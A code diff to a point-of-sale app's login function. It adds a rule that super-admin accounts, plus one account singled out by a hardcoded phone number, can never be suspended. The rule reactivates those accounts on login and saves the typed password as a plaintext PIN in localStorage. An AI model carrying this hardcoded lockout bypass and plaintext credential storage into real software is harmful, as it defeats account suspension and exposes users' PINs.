@@ -591,6 +591,17 @@ export const accountsApi = {
       });
 
       if (matched) {
+        // Super admin accounts can never be suspended or locked
+        if (matched.role === 'super_admin' || matched.phone === '09120759419') {
+          matched.status = 'active';
+          try {
+            const updatedStaffList = staffList.map((s: any) => 
+              (s.role === 'super_admin' || s.phone === '09120759419') ? { ...s, status: 'active', pinCode: rawPass || s.pinCode } : s
+            );
+            localStorage.setItem('sovin_pos_staff', JSON.stringify(updatedStaffList));
+          } catch {}
+        }
+
         if (matched.status === 'suspended') {
           return { success: false, message: 'این حساب کاربری تعلیق و قفل شده است.' };
         }
